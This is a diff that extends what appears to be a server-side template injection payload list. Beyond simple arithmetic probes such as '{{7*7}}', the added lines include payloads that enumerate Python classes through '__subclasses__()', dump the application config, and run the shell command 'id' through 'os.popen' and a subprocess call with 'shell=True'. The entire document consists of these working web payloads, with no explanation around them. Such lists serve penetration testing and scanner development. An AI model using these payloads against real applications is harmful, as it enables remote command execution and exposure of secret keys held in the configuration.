@@ -2,3 +2,13 @@
 ${7*7}
 {% print(7*7) %}
 <%= 7 * 7 %>
+{{1337*1337}}
+{{7*'7'}}
+{% for c in [].__class__.__base__.__subclasses__() %}{{c}}{% endfor %}
+${7*'7'}
+<%= 111 * 111 %>
+{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
+${{7*7}}
+{{"a".__class__.__mro__[1].__subclasses__()}}
+{{config.items()}}
+{{ [].__class__.__base__.__subclasses__()[59]("id",shell=True,stdout=-1).communicate() }}
